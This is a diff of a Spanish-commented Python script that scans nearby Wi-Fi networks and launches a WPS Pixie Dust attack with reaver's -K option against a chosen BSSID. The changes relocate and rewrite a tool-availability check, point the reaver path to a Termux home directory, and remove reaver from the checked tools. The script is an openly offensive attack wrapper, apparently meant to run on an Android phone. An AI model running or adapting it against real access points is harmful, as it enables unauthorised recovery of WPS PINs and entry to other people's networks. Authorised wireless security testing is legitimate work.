@@ -4,6 +4,11 @@ import os
 import tempfile
 import time
 
+def check_tool_availability(tool):
+    """Verifica si una herramienta está disponible en el sistema."""
+    result = subprocess.run(["which", tool], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    return result.returncode == 0
+
 def run_command(command, use_sudo=False):
     """Ejecuta un comando de shell y muestra la salida"""
     if use_sudo:
@@ -21,14 +26,6 @@ def extract_value(output, key):
     """Extrae un valor de la salida del comando basado en una clave"""
     match = re.search(f"{key} ([0-9a-fA-F:]+)", output)
     return match.group(1) if match else None
-
-def check_tool_availability(tool):
-    """Verifica si una herramienta está disponible en el sistema"""
-    result, _ = run_command(f"which {tool}")
-    if result.strip() == "":
-        print(f"Error: {tool} no está instalado o no está en el PATH.")
-        return False
-    return True
 
 def scan_wifi(interface):
     """Escanear redes Wi-Fi cercanas utilizando la interfaz especificada"""
@@ -57,7 +54,7 @@ def scan_wifi(interface):
 def perform_pixie_dust_attack(interface, bssid):
     """Realiza el ataque Pixie Dust usando reaver con la opción -K."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
-    reaver_path = "~/reaver-wps-fork-t6x/src/reaver"
+    reaver_path = "/data/data/com.termux/files/home/reaver-wps-fork-t6x/src/reaver"
     command = f"{reaver_path} -i {interface} -b {bssid} -K"
     print(f"Ejecutando reaver: {command}")
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -88,7 +85,7 @@ def perform_pixie_dust_attack(interface, bssid):
 
 def main():
     # Verificar la disponibilidad de las herramientas necesarias
-    tools = ["iw", "~/reaver-wps-fork-t6x/src/reaver"]
+    tools = ["iw"]
     for tool in tools:
         if not check_tool_availability(tool):
             return
